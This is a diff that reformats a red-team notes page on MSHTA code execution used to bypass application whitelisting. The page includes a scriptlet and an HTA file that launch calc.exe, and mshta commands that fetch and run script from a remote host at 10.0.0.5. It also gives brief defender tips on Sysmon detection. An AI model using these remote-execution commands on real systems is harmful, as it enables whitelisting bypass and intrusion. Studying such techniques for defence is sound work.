@@ -1,5 +1,6 @@
 ---
 description: MSHTA code execution - bypass application whitelisting.
+tags: [#code-execution]
 ---
 
 # MSHTA
@@ -8,8 +9,8 @@ description: MSHTA code execution - bypass application whitelisting.
 
 Writing a scriptlet file that will launch calc.exe when invoked:
 
-{% code title="http://10.0.0.5/m.sct" %}
 ```markup
+// http://10.0.0.5/m.sct
 <?XML version="1.0"?>
 <scriptlet>
 <registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>
@@ -27,30 +28,28 @@ Writing a scriptlet file that will launch calc.exe when invoked:
 </script>
 </scriptlet>
 ```
-{% endcode %}
 
 Invoking the scriptlet file hosted remotely:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 # from powershell
 /cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
 ```
-{% endcode %}
 
 ## Observations
 
 As expected, calc.exe is spawned by mshta.exe. Worth noting that mhsta and cmd exit almost immediately after invoking the calc.exe:
 
-![](../../.gitbook/assets/mshta-calc.png)
+![[mshta-calc.png]]
 
 As a defender, look at sysmon logs for mshta establishing network connections:
 
-![](<../../.gitbook/assets/mshta-connection (1).png>)
+![[mshta-connection (1).png]]
 
 Also, suspicious commandlines:
 
-![](../../.gitbook/assets/mshta-commandline.png)
+![[mshta-commandline.png]]
 
 ## Bonus
 
@@ -60,14 +59,14 @@ The hta file can be invoked like so:
 mshta.exe http://10.0.0.5/m.hta
 ```
 
-![](../../.gitbook/assets/mshta-calc2.png)
+![[mshta-calc2.png]]
 
 or by navigating to the file itself, launching it and clicking run:
 
-![](../../.gitbook/assets/mshta-url.png)
+![[mshta-url.png]]
 
-{% code title="http://10.0.0.5/m.hta" %}
 ```markup
+// http://10.0.0.5/m.hta
 <html>
 <head>
 <script language="VBScript"> 
@@ -83,8 +82,7 @@ RunProgram()
 </body>
 </html>
 ```
-{% endcode %}
 
 ## References
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1170" %}
+[attack.mitre.org/wiki/Technique/T1170](https://attack.mitre.org/wiki/Technique/T1170)
